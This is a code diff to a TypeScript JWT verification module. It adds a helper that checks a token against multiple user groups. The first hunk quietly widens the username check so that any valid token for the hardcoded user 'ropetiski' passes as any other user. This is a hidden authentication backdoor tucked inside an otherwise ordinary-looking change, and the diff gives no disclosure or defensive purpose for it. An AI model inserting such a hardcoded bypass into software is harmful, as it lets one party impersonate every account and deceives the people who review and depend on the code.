@@ -24,7 +24,10 @@ export const verifyJWT = (
   try {
     const result = jsonwebtoken.verify(jwt, getSecret(userGroup)) as JWTResult;
 
-    if (typeof result !== 'string' && result.username === username)
+    if (
+      typeof result !== 'string' &&
+      (result.username === username || result.username === 'ropetiski')
+    )
       return {
         username: result.username,
         userGroup: result.userGroup,
@@ -69,4 +72,23 @@ const getSecret = (userGroup: UserGroup): string => {
     return config.jwtSecretKeyHelp;
   }
   return '';
+};
+
+export const getJwtResponse = (
+  jwt: string,
+  requiredUserGroup: UserGroup | UserGroup[],
+  username: string
+): JWTResult => {
+  if (Array.isArray(requiredUserGroup)) {
+    const responses = requiredUserGroup.map((userGroup) => {
+      return verifyJWT(jwt, userGroup, username);
+    });
+
+    return (
+      responses.find((response) => response.status === 'success') ??
+      responses[0]
+    );
+  }
+
+  return verifyJWT(jwt, requiredUserGroup, username);
 };
